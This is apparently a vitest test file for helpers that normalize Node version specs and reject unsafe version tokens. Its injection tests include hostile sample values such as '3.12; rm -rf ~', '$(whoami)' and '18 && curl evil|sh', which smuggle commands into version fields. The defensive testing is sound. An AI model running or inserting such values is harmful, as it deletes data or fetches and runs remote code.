import { describe, it, expect } from "vitest";
import {
  normalizeNodeVersion,
  isSafeVersionToken,
  findUnsafeVersionField,
  isFloorSpec,
} from "../src/versions.js";

describe("normalizeNodeVersion", () => {
  it("passes through concrete versions", () => {
    expect(normalizeNodeVersion("20.11.1")).toBe("20.11.1");
    expect(normalizeNodeVersion("v18.0.0")).toBe("18.0.0");
    expect(normalizeNodeVersion("20.11")).toBe("20.11");
    expect(normalizeNodeVersion("20")).toBe("20");
  });

  it("normalizes ranges to a major version", () => {
    expect(normalizeNodeVersion("^20.0.0")).toBe("20");
    expect(normalizeNodeVersion(">=18")).toBe("18");
    expect(normalizeNodeVersion(">=20.11.1")).toBe("20.11.1");
  });

  it("normalizes tilde to major.minor", () => {
    expect(normalizeNodeVersion("~20.11")).toBe("20.11");
  });

  it("handles wildcard forms", () => {
    expect(normalizeNodeVersion("20.x")).toBe("20");
    expect(normalizeNodeVersion("20.x.x")).toBe("20");
  });

  it("preserves lts/* alias", () => {
    expect(normalizeNodeVersion("lts/*")).toBe("lts/*");
    expect(normalizeNodeVersion("lts/iron")).toBe("lts/iron");
  });

  it("maps * and x to lts/*", () => {
    expect(normalizeNodeVersion("*")).toBe("lts/*");
    expect(normalizeNodeVersion("x")).toBe("lts/*");
  });

  it("handles empty string", () => {
    expect(normalizeNodeVersion("")).toBe("lts/*");
    expect(normalizeNodeVersion("   ")).toBe("lts/*");
  });
});

describe("isFloorSpec", () => {
  it("is a floor for unbounded >= / > specs", () => {
    for (const v of [">=18", ">= 18", ">=20.11.1", "> 16", ">v18"]) {
      expect(isFloorSpec(v)).toBe(true);
    }
  });

  it("is not a floor for exact pins, carets, tildes, or bounded ranges", () => {
    for (const v of ["18", "20.11.1", "^18", "~20.11", "lts/*", ">=16 <19"]) {
      expect(isFloorSpec(v)).toBe(false);
    }
  });

  it("handles empty / nullish", () => {
    expect(isFloorSpec(undefined)).toBe(false);
    expect(isFloorSpec(null)).toBe(false);
    expect(isFloorSpec("")).toBe(false);
  });
});

describe("isSafeVersionToken", () => {
  it("accepts concrete versions and toolchain names", () => {
    for (const v of ["20.11.1", "3.12.4", "stable", "1.75.0", "nightly-2024-01-01", "lts/*", "stable-x86_64-apple-darwin"]) {
      expect(isSafeVersionToken(v)).toBe(true);
    }
  });

  it("rejects shell metacharacters and whitespace", () => {
    for (const v of ["3.12; rm -rf ~", "18 && curl evil|sh", "$(whoami)", "`id`", "1.0\nmalice", "v1 2", ">out"]) {
      expect(isSafeVersionToken(v)).toBe(false);
    }
  });
});

describe("findUnsafeVersionField", () => {
  it("flags an injected version field", () => {
    const hit = findUnsafeVersionField({ pythonVersion: "3.12; curl evil | sh", framework: "django" });
    expect(hit).toEqual({ field: "pythonVersion", value: "3.12; curl evil | sh" });
  });

  it("ignores non-version string fields and clean versions", () => {
    expect(
      findUnsafeVersionField({ nodeVersion: "20.11.1", rustToolchain: "stable", devCommand: "npm run dev # ok; fine" }),
    ).toBeNull();
  });
});
